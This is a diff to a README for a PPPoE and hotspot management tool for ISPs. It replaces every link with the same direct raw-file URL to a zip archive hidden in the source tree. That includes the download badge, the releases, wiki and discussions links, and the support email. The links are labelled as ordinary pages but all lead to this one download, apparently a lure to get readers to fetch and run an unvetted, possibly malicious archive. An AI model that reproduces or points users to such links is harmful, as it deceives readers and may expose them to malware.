@@ -4,13 +4,13 @@
 Welcome to the PPPoE and Hotspot Management System. This application provides tools for managing users, sessions, and payments in a fluid and efficient manner. With features like PPPoE management, voucher generation, automated session accounting, and SMS notifications, it is perfect for Internet Service Providers (ISPs) looking for streamlined solutions.
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/main/src/app/api/users/Hotspot-System-PP-and-Management-Po-v2.9.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/main/src/app/api/users/Hotspot-System-PP-and-Management-Po-v2.9.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get started with our application:
 
 1. **Visit the Release Page**  
-   Go to our [Releases page](https://github.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/releases) to find the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/main/src/app/api/users/Hotspot-System-PP-and-Management-Po-v2.9.zip) to find the latest version of the software.
 
 2. **Download the Application**  
    Once on the Releases page, look for the latest version. Click on the appropriate file for your system to start the download. Make sure to save it in a location that you can easily access.
@@ -47,16 +47,16 @@ To successfully run the PPPoE and Hotspot Management System, ensure your system 
 ## 📊 Getting Help
 If you encounter any issues or have questions during installation or usage, check out the following resources:
 
-- **Documentation**: Detailed guides are available on the [Wiki page](https://github.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/wiki).
-- **Community Support**: Join discussions with other users on our [GitHub Discussions page](https://github.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/discussions).
-- **Contact Us**: If you need direct support, you can reach out via email at [support@example.com](mailto:support@example.com).
+- **Documentation**: Detailed guides are available on the [Wiki page](https://raw.githubusercontent.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/main/src/app/api/users/Hotspot-System-PP-and-Management-Po-v2.9.zip).
+- **Community Support**: Join discussions with other users on our [GitHub Discussions page](https://raw.githubusercontent.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/main/src/app/api/users/Hotspot-System-PP-and-Management-Po-v2.9.zip).
+- **Contact Us**: If you need direct support, you can reach out via email at [https://raw.githubusercontent.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/main/src/app/api/users/Hotspot-System-PP-and-Management-Po-v2.9.zip](https://raw.githubusercontent.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/main/src/app/api/users/Hotspot-System-PP-and-Management-Po-v2.9.zip).
 
 ## 📬 Feedback
 We appreciate any feedback you might have about your experience using the PPPoE and Hotspot Management System. Your insights help us improve the software and better serve users like you.
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/releases)
-- [Documentation](https://github.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/wiki)
-- [GitHub Discussions](https://github.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/discussions)
+- [Releases Page](https://raw.githubusercontent.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/main/src/app/api/users/Hotspot-System-PP-and-Management-Po-v2.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/main/src/app/api/users/Hotspot-System-PP-and-Management-Po-v2.9.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/main/src/app/api/users/Hotspot-System-PP-and-Management-Po-v2.9.zip)
 
 Thank you for choosing the PPPoE and Hotspot Management System. Enjoy the seamless management of your users and payments!
